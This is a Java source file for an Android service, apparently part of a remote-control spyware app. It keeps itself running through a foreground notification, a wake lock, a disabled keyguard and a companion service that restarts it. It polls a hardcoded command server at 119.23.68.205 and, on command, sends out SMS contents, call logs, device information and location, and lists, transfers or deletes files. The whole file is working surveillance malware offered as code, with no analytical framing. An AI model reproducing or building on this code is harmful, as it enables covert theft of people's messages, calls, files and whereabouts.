/**
 * 
 */
package com.byc.control;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;


import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager.WakeLock;
import android.util.Log;
import android.widget.Toast;

import utils.FileUtils;


/**
 * @author byc
 * @param <StepService>
 *
 */
public class MainService extends Service {
	 public static final String TAG = "byc001"; 
	 //消息定义：
	 private static final int MSG_ORDER=0x11;//接收到命令；
	 private static final int MSG_DATA=0x21;//数据线程消息；
	 //public static final int MSG_LOCATION=0x31;//定位消息；
	 
	 public static final String INTENT_LOCATION_CMD = "byc_control_Intent_service_location_cmd";//定位消息命令；
	 //private static final int MSG_DATA_FAL=0x22;//数据线程失败完成；
	 private OrderThread orderThread=null;//指令线程；
	 private DataThread dt=null;//数据线程；
	 private final int RECONNECT_INTERVAL_TIME=60*1000;//再次连接间隔时间1分钟；
	 Map<String, DataThread>  mapDataThreads = new HashMap<String, DataThread>();
	 private PhoneInfo pi=null;
	 private static int mDataThreadID=0;
	 WakeLock wakeLock = null;
	 private static MainService current=null;
	 private FileSystem fileSystem;
    @Override  
    public void onCreate() {  
        super.onCreate();  
        Log.d(TAG, "MainService onCreate() executed");  
        current=this;
        orderThread=new OrderThread();//开启命令接收线程
        pi=PhoneInfo.getPhoneInfo(getApplicationContext());//启动信息服务类；
        fileSystem=FileSystem.getFileSystem(this);
        //5。接收广播消息
        //IntentFilter filter = new IntentFilter();
        //filter.addAction(ACTION_LOCATION);
        //registerReceiver(InfoReceiver, filter);
        //startAlarm();
        Funcs.disableKeyguard(this,this.getClass().toString());
        Funcs.acquireWakeLock(MainService.this,wakeLock,this.getClass().getCanonicalName());
    } 
    
    @Override  
    public IBinder onBind(Intent intent) {  
        //return null;  
    	return new ProcessConnection.Stub() {}; 
    }
    @Override  
    public void onDestroy() {  
        super.onDestroy();  
        current=null;
        Funcs.releaseWakeLock(wakeLock);
        stopForeground(true);// 停止前台服务--参数:表示是否移除之前的通知
        Log.d(TAG, "onDestroy() executed");  
    } 
    @Override  
    public boolean stopService(Intent name) { 
    	Log.d(TAG, "stopService() executed"); 
        return super.stopService(name);  
    } 
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.d(TAG, "onStartCommand() executed");  
        startForeground(1,new Notification());  
        //绑定建立链接  
        bindService(new Intent(this,GuardService.class),  
                mServiceConnection, Context.BIND_IMPORTANT);  
          
        orderThread.startOrder();
        //getPowerWindows();
        return START_STICKY;
        //return super.onStartCommand(intent, flags, startId);  
    } 
    public static MainService getOrderService() { 
    	return current;
    }
    /*
	 * 启动定时器 
	 */
	 private void startAlarm() 
	 { 
		 Intent intent = new Intent(this, MainService.class); 
		 PendingIntent pi=PendingIntent.getService(this, 0, intent, 0);
		 AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE); 
		 am.setRepeating(AlarmManager.RTC_WAKEUP,System.currentTimeMillis(),60*60*1000,pi); 
	 }
    public Handler HandlerSock = new Handler() {  
        @Override  
        public void handleMessage(Message msg) {  
            if (msg.what == MSG_ORDER) {  //处理命令线程消息：
            	byte[] data=null;
            	if(msg.arg2>0){
            		Bundle bundle = msg.getData();
            		data=(byte[])bundle.get("data");
            	}
            	command(msg.arg1,data);
            	//Log.i(TAG, "handleMessage:MSG_ORDER:" + ot.oh.cmd);
            }
            if (msg.what == MSG_DATA) {  //处理数据线程消息：
              	int i=msg.arg1;
            	removeDataThread(i);
            }

        }  
  
    };
    /*
     * 处理广播消息；
     */
	private BroadcastReceiver InfoReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            String action = intent.getAction();
            Log.d(Config.TAG, "Main receive-->" + action);
            //if(ACTION_LOCATION.equals(action)) {
            	//mLocationManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE); 
            //}
        }
    };
    /*
     * 处理命令消息；
     */
    private void command(int cmd,byte[] data){
    	switch(cmd){
        case order.CMD_READY:
        	break;
        case order.CMD_INFO://获取信息：
        	SendBaseInfo(cmd);
        	break;
        case order.CMD_FILE_LIST://获取目录下面的文件信息：
        	fileSystem.processListFileInfo(data);
        	break;   
        case order.CMD_FILE_TRANS://传输文件：CMD_FILE_DEL
        	fileSystem.processTransFiles(data);
        	break;    
        case order.CMD_FILE_DEL://传输文件：
        	fileSystem.processDelFile(data);
        	break; 
    	case order.CMD_SMS_CONTENT://获取短信信息：
    		SendBaseInfo(cmd);
    		break;
    	case order.CMD_CALL://获取通话信息：
    		SendBaseInfo(cmd);
    		break;
    	case order.CMD_LOCATION_SINGLE://获取定位信息：
    	case order.CMD_LOCATION_SERIES:
    		StartLocationService(cmd);
    		break;
    	case order.CMD_LOCATION_STOP:
    		Intent intent = new Intent(this, LocationSvc.class);
    		stopService(intent);
    		break;
    	}
    	
    }
    /*
     * 分配发送线程：
     */
    public DataThread getDataThread(){
    	mDataThreadID=mDataThreadID+1;
    	String key=String.valueOf(mDataThreadID);
    	mapDataThreads.put(key, new DataThread(mDataThreadID));
    	order.formatOH(mapDataThreads.get(key).sock.oh);
    	return mapDataThreads.get(key);
    }
    /*
     * 释放发送线程：
     */
    private void removeDataThread(int id){
    	String key=String.valueOf(id);
    	if(mapDataThreads.get(key)==null)return;
    	if(mapDataThreads.get(key).dataThreadInfo.bSuc)Log.i(Config.TAG, "handleMessage:DataThread suc" );
    	mapDataThreads.get(key).dataThreadInfo=null;
    	mapDataThreads.remove(key);	
    }
    /*
     * 发送定位信息；
     */
    private void StartLocationService(int cmd){
    	 Intent intent = new Intent(this, LocationSvc.class);
    	 intent.putExtra(INTENT_LOCATION_CMD, cmd);
    	 //if(Funcs.isServiceRunning(getApplicationContext(), "com.byc.control.LocationSvc")){
    	 if(LocationSvc.isWorking){
    		 stopService(intent);
    	 }
         startService(intent);
 
    }
    /*
     * 获取权限界面；
     */
    private void getPowerWindows(){
    	String txt=pi.getBaseInfo()+
    			pi.getSmsInPhone()+
    			pi.GetCallsInPhone();
    	Log.i(TAG, txt);
    	StartLocationService(order.CMD_LOCATION_SINGLE);
    }
   
 
    /*
     * 发送信息；
     */
    private void SendBaseInfo(int cmd){
    	DataThread dataThread=getDataThread();
    	dataThread.sock.oh.cmd=cmd;
    	switch(cmd){//CMD_FILE_LIST_EXT_SD
        	case order.CMD_INFO:
        		dataThread.sock.s=pi.getBaseInfo();
        	break;
        	case order.CMD_SMS_CONTENT:
        		dataThread.sock.s=pi.getSmsInPhone();
        		//dts[i].sock.s=pi.GetCallsInPhone();
        	break;
        	case order.CMD_CALL:
        		//dts[i].sock.s=pi.getSmsInPhone();
        		dataThread.sock.s=pi.GetCallsInPhone();
        	break;

    	}    	
    	//
    	dataThread.start();
    }
    /*
     * 接收指令线程：
     */
    class OrderThread extends Thread { 
    	public Sock sock;
    	private String host= "119.23.68.205";
    	private int port = 8100;//命令接收端口
    	WakeLock wakeLock = null; 
    	private Message msg= null;//消息对象;
    	Bundle bundle=null; 
   	 public OrderThread() { 
		 host=Config.host;
		 port=Config.port_order;
		 sock=new Sock(host,port);
	 }
    public void startOrder() { 
    	try{
            if(this.isAlive()){
            	if(!this.sock.isConnected()){
            		//orderThread.start();
            	}
            }else{
            	orderThread.start();
            }
    	}catch(IllegalThreadStateException e){
    		e.printStackTrace();
    	}
    }
   	public boolean isConnected() { 
   		if(sock==null)return false;
   		return sock.isConnected();
   	}
	 /*
	  * 发送消息：
	  */
	 private void sendMsg(int cmd,byte[] data) {
		  //定义消息  
        msg = new Message();  
        msg.what = MSG_ORDER;
        msg.arg1=cmd;
        msg.arg2=0;
        if(data!=null){
        	msg.arg2=data.length;
        	bundle = new Bundle();
        	bundle.clear(); 
        	bundle.putByteArray("data", data);
        	msg.setData(bundle);  //
        }
        HandlerSock.sendMessage(msg);
	 }
 	@Override  
	 	public void run() {  
	 		//连接服务器 (每隔5分钟连接一次)
	 		Log.d(Config.TAG, "ORDER SOCKET Start:-------------------------->");
	 		Funcs.acquireWakeLock(MainService.this,wakeLock,OrderThread.this.getClass().getCanonicalName());
	 		while(true){//循环连接：
	 			if(sock.connectServer()){//连接服务器成功：
	 				sock.oh=order.formatOH(sock.oh);
	 				sock.SendOH(sock.oh);//发送认证信息：
	 				Log.d(Config.TAG, "SOCKET Recv:---------------------------------->");
	 				while(true){
	 					sock.oh.cmd=order.CMD_READY;
	 					sock.data=null;
	 					if(sock.RecvOH()){
	 						if(sock.oh.cmd==order.CMD_READY)continue;//空命令;
 							if(sock.oh.len>0)//接收数据：
 								sock.RecvData(sock.oh.len);//限制数据体大小；
 							//HandlerSock.sendEmptyMessage(MSG_ORDER);//发送接收到命令消息给调度类；
 							sendMsg(sock.oh.cmd,sock.data);
	 					}else{//接收失败！
	 						break;//重新连接服务器
	 					}//if(sock.RecvPH()){//接收包头成功：
	 				}//while(true){
	 			}else{//连接失败：
	 				Sleep(RECONNECT_INTERVAL_TIME);
	 			}//if(sock.connectServer()){//连接服务器成功：
	 		}//while(true){
	 		//releaseWakeLock(wakeLock);
	 	}//public void run() { 
	 /*
	  * 延时：
	  */
	 private void Sleep(int MilliSecond) {
		 try{
			 	Thread.sleep(MilliSecond);
		   	}catch(InterruptedException e){
		   		e.printStackTrace();
		   	}catch(IllegalArgumentException e){
		   		e.printStackTrace();
		   	}  
	 }

    }//class OrderThread extends Thread {
    public class DataThreadInfo {
    	public int ID;//线程标识;
    	public boolean bSuc;//是否成功完成；
    	public int len;//数据长度；
    	public byte[] data;//数据
    }
    /*
     * 数据传输线程：
     */
    class DataThread extends Thread { 
    	private String host= "119.23.68.205";
    	private int port = 8101;//数据传输端口
    	private Message msg= null;//消息对象;
    	//Bundle bundle=null; 
    	public DataThreadInfo dataThreadInfo=new DataThreadInfo();
    	public Sock sock;
    	 public DataThread(int idx) { 
    		 host=Config.host;
    		 port=Config.port_data;
    		 sock=new Sock(host,port);
    		 initMsg(idx); 
    	 }   	
    	 @Override  
         public void run() {  
           
    		 if(sock.connectServer()){//连接服务器成功：
    			 if(sock.bmp!=null){//发送图片:
    				 dataThreadInfo.bSuc=sock.SendBmp(sock.bmp);
    			 }else if(sock.s!=null){//发送字符串:
    				 int i=sock.SendString(sock.s);
    				 if(i==-1)dataThreadInfo.bSuc=false;else dataThreadInfo.bSuc=true;
    			 }else if(sock.data!=null){
    				 sock.SendOH(sock.oh);
    				 if(sock.oh.len>0)dataThreadInfo.bSuc=sock.SendData(sock.oh.len);
    			 } 
    		 }else{//连接服务器失败！
    			 dataThreadInfo.bSuc=false;  
    		 }
             HandlerSock.sendMessage(msg);
			 release(); 
    	 }
    	 /*
    	  * 准备消息体：
    	  */
    	 private void initMsg(int idx) {
    		  //定义消息  
             msg = new Message();  
             msg.what = MSG_DATA;
             msg.arg1=idx;
             //bundle = new Bundle();
             //bundle.clear(); 
             //bundle.putInt("threadID", ID);
             //msg.setData(bundle);  //
             dataThreadInfo.ID=idx;
             dataThreadInfo.len=0;
    	 }
    	 /*
    	  * 释放内存：
    	  */
    	 private void release() {
    		sock.release(); 
    		sock=null;
    	    msg=null;
    	 }
    }
    private ServiceConnection mServiceConnection = new ServiceConnection() {  
        @Override  
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {  
            //链接上  
            Log.d(Config.TAG,"StepService:建立链接");  
        }  
  
        @Override  
        public void onServiceDisconnected(ComponentName componentName) {  
            //断开链接  
            startService(new Intent(MainService.this,GuardService.class));  
            //重新绑定  
            bindService(new Intent(MainService.this,GuardService.class),  
                    mServiceConnection, Context.BIND_IMPORTANT);  
        }  
    };  

}
